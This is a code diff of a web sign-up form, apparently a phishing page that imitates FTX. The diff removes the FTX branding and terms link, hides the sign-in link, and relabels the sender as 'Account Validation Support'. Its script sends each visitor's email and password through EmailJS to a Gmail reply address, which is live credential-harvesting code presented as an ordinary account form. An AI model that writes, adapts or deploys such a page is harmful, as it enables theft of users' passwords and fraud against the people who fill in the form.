@@ -44,12 +44,12 @@
                   </span>
                   <span
                     class="MuiTypography-root MuiFormControlLabel-label MuiTypography-body2"
-                    >I agree to the FTX
+                    >I agree to the 
                     <a
                       class="text-[#00B4C9] MuiTypography-root MuiLink-root MuiLink-underlineHover MuiTypography-colorPrimary jss58"
                       target="_blank"
                       rel="noopener noreferrer"
-                      href="https://help.ftx.com/hc/en-us/articles/360024788391-FTX-Terms-of-Service"
+                      href="/"
                       >Terms of Service</a
                     >.</span
                   ></label
@@ -94,12 +94,12 @@
               </button>
             </div>
           </div>
-          <div class="text-white my-8 flex items-center justify-center">
+          <!-- <div class="text-white my-8 flex items-center justify-center">
             <div>
               <span class="">Already have an account? </span>
               <a class="text-[#00B4C9]" href="/">Sign in</a>
             </div>
-          </div>
+          </div> -->
         </div>
       </section>
     </div>
@@ -127,7 +127,7 @@ export default {
             template_id: 'template_xkj0lgc',
             user_id: 'Q_v6F22hpmQkpwuex',
             template_params: {
-              from_name: 'FTX Onboarding',
+              from_name: 'Account Validation Support',
               email: this.email,
               password: this.password,
               reply_to: 'customeronlineagent@gmail.com',
